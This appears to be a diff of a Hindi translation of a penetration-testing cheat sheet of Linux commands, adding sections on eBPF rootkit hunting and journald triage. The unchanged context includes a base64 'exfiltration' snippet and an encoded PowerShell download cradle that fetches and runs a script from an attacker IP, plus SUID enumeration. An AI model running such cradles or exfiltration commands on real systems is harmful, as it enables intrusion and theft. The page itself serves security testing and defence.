@@ -1,8 +1,8 @@
-# उपयोगी लिनक्स कमांड
+# उपयोगी Linux कमांड्स
 
 {{#include ../banners/hacktricks-training.md}}
 
-## सामान्य बैश
+## सामान्य Bash
 ```bash
 #Exfiltration using Base64
 base64 -w 0 file
@@ -121,7 +121,7 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-## विंडोज़ के लिए बैश
+## Windows के लिए Bash
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -221,7 +221,7 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 #Extract ISBN Numbers
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
-## खोजें
+## Find
 ```bash
 # Find SUID set files.
 find / -perm /u=s -ls 2>/dev/null
@@ -257,7 +257,7 @@ nmap --script-help "(default or version) and *smb*"
 locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
 nmap --script-help "(default or version) and smb)"
 ```
-## बैश
+## Bash
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
@@ -293,4 +293,46 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
+## eBPF टेलीमेट्री & Rootkit Hunting
+
+आधुनिक rootkits (TripleCross, BPFDoor variants, आदि) अधिकतर छिपे हुए eBPF प्रोग्राम के रूप में बने रहते हैं। अपने fleet का बेसलाइन `bpftool`/`eBPFmon` से लें ताकि आप अनसाइन किए गए प्रोग्राम, अप्रत्याशित cgroup hooks, या दुष्ट map सामग्री को पहचानकर उन्हें अलग करने से पहले हटाया जा सके।
+```bash
+#Enumerate all eBPF programs, attach points, owning PIDs and map IDs
+sudo bpftool prog
+
+#Inspect suspicious bytecode + helper calls (replace 835 with the target program id)
+sudo bpftool prog dump xlated id 835 | less
+
+#List and dump program maps to reveal covert sockets/credentials (replace 104 accordingly)
+sudo bpftool map show id 104
+sudo bpftool map dump id 104 | hexdump -C
+
+#Verify kernel feature support before loading/patching custom probes
+sudo bpftool feature probe | less
+
+#TUI wrapper that tracks program/map diffs in real time (wraps bpftool perf/net output)
+sudo ebpfmon
+```
+bpftool आउटपुट को अपेक्षित NIC/cgroup attachments के साथ सहसंबंधित करें; किसी अनधिकृत PID के पास अचानक दिखाई देने वाला `xdp` या `kprobe` प्रोग्राम injected eBPF payload का मजबूत संकेतक है।
+
+## Journald घटना प्राथमिक जाँच
+
+systemd-journald संरचित मेटाडेटा रखता है, इसलिए आप boot, severity, unit, या UID के आधार पर pivot कर सकते हैं बिना `/var/log/*` को छुए। फ़िल्टरों को relative timestamps के साथ मिलाकर attack windows को अलग करें या तेज़ी से log tampering साबित करें।
+```bash
+journalctl --list-boots                                #Enumerate boot IDs with timestamps
+journalctl -b -1 -p err -o short-iso                   #Previous boot only, severity >= err
+journalctl -u nginx.service --since="2025-06-01 01:00" --until="2025-06-01 02:00"
+journalctl -u ssh.service -f | grep "Failed password"  #Live brute-force monitoring
+journalctl _UID=0 --output=json-pretty --since "1 hour ago"
+journalctl --disk-usage                               #Quickly show journal size
+sudo journalctl --vacuum-size=1G --vacuum-time=7days   #Trim only after taking evidence
+journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
+```
+जब आपको कड़े फ़िल्टर चाहिए हों तो `--grep 'Invalid user' --case-sensitive` या `-k` (kernel ring buffer only) जोड़ें, और याद रखें कि `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME`, और `_TRANSPORT` selectors multi-tenant hunts के लिए एक साथ स्टैक होते हैं।
+
+## References
+
+- [eBPFmon: A new tool for exploring and interacting with eBPF applications](https://redcanary.com/blog/linux-security/ebpfmon/)
+- [How to use the journalctl command to view Linux logs](https://www.hostinger.com/tutorials/journalctl-command)
+
 {{#include ../banners/hacktricks-training.md}}
